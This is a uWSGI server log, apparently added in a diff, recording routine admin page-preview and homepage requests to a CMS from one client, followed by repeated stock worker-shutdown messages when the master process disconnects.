+[pid: 1184|app: 0|req: 64/108] 219.78.235.164 () {56 vars in 1081 bytes} [Thu Jun  8 03:47:18 2023] GET /admin/jsi18n/ => generated 3343 bytes in 14 msecs (HTTP/1.1 200) 9 headers in 342 bytes (1 switches on core 1)
+[pid: 1184|app: 0|req: 65/109] 219.78.235.164 () {56 vars in 1095 bytes} [Thu Jun  8 03:47:19 2023] GET /admin/sprite-fb2186d2/ => generated 120381 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 322 bytes (1 switches on core 0)
+[pid: 1182|app: 0|req: 19/110] 219.78.235.164 () {58 vars in 1323 bytes} [Thu Jun  8 03:47:19 2023] GET /admin/pages/70/edit/preview/?in_preview_panel=true&mode= => generated 1801 bytes in 27 msecs (HTTP/1.1 200) 9 headers in 340 bytes (1 switches on core 0)
+[pid: 1182|app: 0|req: 20/111] 219.78.235.164 () {60 vars in 1237 bytes} [Thu Jun  8 03:47:20 2023] DELETE /admin/pages/70/edit/preview/ => generated 17 bytes in 16 msecs (HTTP/1.1 200) 9 headers in 324 bytes (1 switches on core 1)
+[pid: 1184|app: 0|req: 66/112] 219.78.235.164 () {56 vars in 1131 bytes} [Thu Jun  8 03:47:20 2023] GET /admin/sprite-fb2186d2/ => generated 120381 bytes in 3 msecs (HTTP/1.1 200) 8 headers in 322 bytes (1 switches on core 0)
+[pid: 1183|app: 0|req: 17/113] 219.78.235.164 () {62 vars in 1341 bytes} [Thu Jun  8 03:47:21 2023] POST /admin/pages/70/edit/preview/ => generated 40 bytes in 71 msecs (HTTP/1.1 200) 10 headers in 469 bytes (2 switches on core 0)
+[pid: 1184|app: 0|req: 67/114] 219.78.235.164 () {58 vars in 1323 bytes} [Thu Jun  8 03:47:21 2023] GET /admin/pages/70/edit/preview/?in_preview_panel=true&mode= => generated 128872 bytes in 110 msecs (HTTP/1.1 200) 9 headers in 342 bytes (1 switches on core 1)
+[pid: 1183|app: 0|req: 18/115] 219.78.235.164 () {58 vars in 1323 bytes} [Thu Jun  8 03:47:22 2023] GET /admin/pages/70/edit/preview/?in_preview_panel=true&mode= => generated 128872 bytes in 115 msecs (HTTP/1.1 200) 9 headers in 342 bytes (1 switches on core 1)
+[pid: 1184|app: 0|req: 68/116] 219.78.235.164 () {60 vars in 1217 bytes} [Thu Jun  8 03:49:29 2023] GET / => generated 140884 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1184|app: 0|req: 69/117] 219.78.235.164 () {56 vars in 1067 bytes} [Thu Jun  8 03:49:34 2023] GET / => generated 129433 bytes in 87 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+Thu Jun  8 04:03:56 2023 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 04:03:56 2023 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 04:03:56 2023 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 04:03:56 2023 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 04:03:56 2023 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 04:03:56 2023 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 04:03:56 2023 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 04:03:56 2023 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
